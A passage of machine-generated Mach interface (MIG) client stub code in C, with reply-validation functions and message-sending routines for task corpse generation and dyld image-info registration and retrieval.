	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->corpse_task_port.type != MACH_MSG_PORT_DESCRIPTOR ||
	    Out0P->corpse_task_port.disposition != 17) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__task_generate_corpse_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_generate_corpse */
mig_external kern_return_t task_generate_corpse
(
	task_read_t task,
	mach_port_t *corpse_task_port
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t corpse_task_port;
		/* end of the kernel processed data */
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t corpse_task_port;
		/* end of the kernel processed data */
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_generate_corpse_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_generate_corpse_t__defined */

	__DeclareSendRpc(3442, "task_generate_corpse")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = task;
	InP->Head.msgh_id = 3442;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3442, "task_generate_corpse")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3442, "task_generate_corpse")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_generate_corpse_t__defined)
	check_result = __MIG_check__Reply__task_generate_corpse_t((__Reply__task_generate_corpse_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_generate_corpse_t__defined) */

	*corpse_task_port = Out0P->corpse_task_port.name;
	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_map_corpse_info_t__defined)
#define __MIG_check__Reply__task_map_corpse_info_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_map_corpse_info_t(__Reply__task_map_corpse_info_t *Out0P)
{

	typedef __Reply__task_map_corpse_info_t __Reply __attribute__((unused));
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 3543) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__task_map_corpse_info_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_map_corpse_info */
mig_external kern_return_t task_map_corpse_info
(
	task_t task,
	task_read_t corspe_task,
	vm_address_t *kcd_addr_begin,
	uint32_t *kcd_size
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t corspe_task;
		/* end of the kernel processed data */
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		vm_address_t kcd_addr_begin;
		uint32_t kcd_size;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		vm_address_t kcd_addr_begin;
		uint32_t kcd_size;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_map_corpse_info_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_map_corpse_info_t__defined */

	__DeclareSendRpc(3443, "task_map_corpse_info")

#if	UseStaticTemplates
	const static mach_msg_port_descriptor_t corspe_taskTemplate = {
		/* name = */		MACH_PORT_NULL,
		/* pad1 = */		0,
		/* pad2 = */		0,
		/* disp = */		19,
		/* type = */		MACH_MSG_PORT_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 1;
#if	UseStaticTemplates
	InP->corspe_task = corspe_taskTemplate;
	InP->corspe_task.name = corspe_task;
#else	/* UseStaticTemplates */
	InP->corspe_task.name = corspe_task;
	InP->corspe_task.disposition = 19;
	InP->corspe_task.type = MACH_MSG_PORT_DESCRIPTOR;
#endif	/* UseStaticTemplates */

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = task;
	InP->Head.msgh_id = 3443;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3443, "task_map_corpse_info")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3443, "task_map_corpse_info")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_map_corpse_info_t__defined)
	check_result = __MIG_check__Reply__task_map_corpse_info_t((__Reply__task_map_corpse_info_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_map_corpse_info_t__defined) */

	*kcd_addr_begin = Out0P->kcd_addr_begin;

	*kcd_size = Out0P->kcd_size;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_register_dyld_image_infos_t__defined)
#define __MIG_check__Reply__task_register_dyld_image_infos_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_register_dyld_image_infos_t(__Reply__task_register_dyld_image_infos_t *Out0P)
{

	typedef __Reply__task_register_dyld_image_infos_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 3544) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__task_register_dyld_image_infos_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_register_dyld_image_infos */
mig_external kern_return_t task_register_dyld_image_infos
(
	task_t task,
	dyld_kernel_image_info_array_t dyld_images,
	mach_msg_type_number_t dyld_imagesCnt
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t dyld_images;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t dyld_imagesCnt;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_register_dyld_image_infos_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_register_dyld_image_infos_t__defined */

	__DeclareSendRpc(3444, "task_register_dyld_image_infos")

#if	UseStaticTemplates
	const static mach_msg_ool_descriptor_t dyld_imagesTemplate = {
		/* addr = */		(void *)0,
		/* size = */		0,
		/* deal = */		FALSE,
		/* copy = */		MACH_MSG_VIRTUAL_COPY,
		/* pad2 = */		0,
		/* type = */		MACH_MSG_OOL_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 1;
#if	UseStaticTemplates
	InP->dyld_images = dyld_imagesTemplate;
	InP->dyld_images.address = (void *)(dyld_images);
	InP->dyld_images.size = dyld_imagesCnt * 40;
#else	/* UseStaticTemplates */
	InP->dyld_images.address = (void *)(dyld_images);
	InP->dyld_images.size = dyld_imagesCnt * 40;
	InP->dyld_images.deallocate =  FALSE;
	InP->dyld_images.copy = MACH_MSG_VIRTUAL_COPY;
	InP->dyld_images.type = MACH_MSG_OOL_DESCRIPTOR;
#endif	/* UseStaticTemplates */

	InP->NDR = NDR_record;

	InP->dyld_imagesCnt = dyld_imagesCnt;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = task;
	InP->Head.msgh_id = 3444;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3444, "task_register_dyld_image_infos")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3444, "task_register_dyld_image_infos")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_register_dyld_image_infos_t__defined)
	check_result = __MIG_check__Reply__task_register_dyld_image_infos_t((__Reply__task_register_dyld_image_infos_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_register_dyld_image_infos_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_unregister_dyld_image_infos_t__defined)
#define __MIG_check__Reply__task_unregister_dyld_image_infos_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_unregister_dyld_image_infos_t(__Reply__task_unregister_dyld_image_infos_t *Out0P)
{

	typedef __Reply__task_unregister_dyld_image_infos_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 3545) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__task_unregister_dyld_image_infos_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_unregister_dyld_image_infos */
mig_external kern_return_t task_unregister_dyld_image_infos
(
	task_t task,
	dyld_kernel_image_info_array_t dyld_images,
	mach_msg_type_number_t dyld_imagesCnt
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t dyld_images;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t dyld_imagesCnt;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_unregister_dyld_image_infos_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_unregister_dyld_image_infos_t__defined */

	__DeclareSendRpc(3445, "task_unregister_dyld_image_infos")

#if	UseStaticTemplates
	const static mach_msg_ool_descriptor_t dyld_imagesTemplate = {
		/* addr = */		(void *)0,
		/* size = */		0,
		/* deal = */		FALSE,
		/* copy = */		MACH_MSG_VIRTUAL_COPY,
		/* pad2 = */		0,
		/* type = */		MACH_MSG_OOL_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 1;
#if	UseStaticTemplates
	InP->dyld_images = dyld_imagesTemplate;
	InP->dyld_images.address = (void *)(dyld_images);
	InP->dyld_images.size = dyld_imagesCnt * 40;
#else	/* UseStaticTemplates */
	InP->dyld_images.address = (void *)(dyld_images);
	InP->dyld_images.size = dyld_imagesCnt * 40;
	InP->dyld_images.deallocate =  FALSE;
	InP->dyld_images.copy = MACH_MSG_VIRTUAL_COPY;
	InP->dyld_images.type = MACH_MSG_OOL_DESCRIPTOR;
#endif	/* UseStaticTemplates */

	InP->NDR = NDR_record;

	InP->dyld_imagesCnt = dyld_imagesCnt;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = task;
	InP->Head.msgh_id = 3445;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3445, "task_unregister_dyld_image_infos")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3445, "task_unregister_dyld_image_infos")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_unregister_dyld_image_infos_t__defined)
	check_result = __MIG_check__Reply__task_unregister_dyld_image_infos_t((__Reply__task_unregister_dyld_image_infos_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_unregister_dyld_image_infos_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_get_dyld_image_infos_t__defined)
#define __MIG_check__Reply__task_get_dyld_image_infos_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_get_dyld_image_infos_t(__Reply__task_get_dyld_image_infos_t *Out0P)
{

	typedef __Reply__task_get_dyld_image_infos_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 3546) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->dyld_images.type != MACH_MSG_OOL_DESCRIPTOR) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

#if __MigTypeCheck
	if (Out0P->dyld_images.size / 40 != Out0P->dyld_imagesCnt)
		return MIG_TYPE_ERROR;
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__task_get_dyld_image_infos_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_get_dyld_image_infos */
mig_external kern_return_t task_get_dyld_image_infos
(
	task_read_t task,
	dyld_kernel_image_info_array_t *dyld_images,
	mach_msg_type_number_t *dyld_imagesCnt
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t dyld_images;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t dyld_imagesCnt;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t dyld_images;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t dyld_imagesCnt;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_get_dyld_image_infos_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_get_dyld_image_infos_t__defined */

	__DeclareSendRpc(3446, "task_get_dyld_image_infos")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = task;
	InP->Head.msgh_id = 3446;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3446, "task_get_dyld_image_infos")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3446, "task_get_dyld_image_infos")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_get_dyld_image_infos_t__defined)
	check_result = __MIG_check__Reply__task_get_dyld_image_infos_t((__Reply__task_get_dyld_image_infos_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_get_dyld_image_infos_t__defined) */

	*dyld_images = (dyld_kernel_image_info_array_t)(Out0P->dyld_images.address);
	*dyld_imagesCnt = Out0P->dyld_imagesCnt;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_register_dyld_shared_cache_image_info_t__defined)
#define __MIG_check__Reply__task_register_dyld_shared_cache_image_info_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_register_dyld_shared_cache_image_info_t(__Reply__task_register_dyld_shared_cache_image_info_t *Out0P)
{

	typedef __Reply__task_register_dyld_shared_cache_image_info_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 3547) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__task_register_dyld_shared_cache_image_info_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_register_dyld_shared_cache_image_info */
mig_external kern_return_t task_register_dyld_shared_cache_image_info
(
	task_t task,
	dyld_kernel_image_info_t dyld_cache_image,
	boolean_t no_cache,
	boolean_t private_cache
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		dyld_kernel_image_info_t dyld_cache_image;
		boolean_t no_cache;
		boolean_t private_cache;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_register_dyld_shared_cache_image_info_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_register_dyld_shared_cache_image_info_t__defined */

	__DeclareSendRpc(3447, "task_register_dyld_shared_cache_image_info")

	InP->NDR = NDR_record;

	InP->dyld_cache_image = dyld_cache_image;

	InP->no_cache = no_cache;

	InP->private_cache = private_cache;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
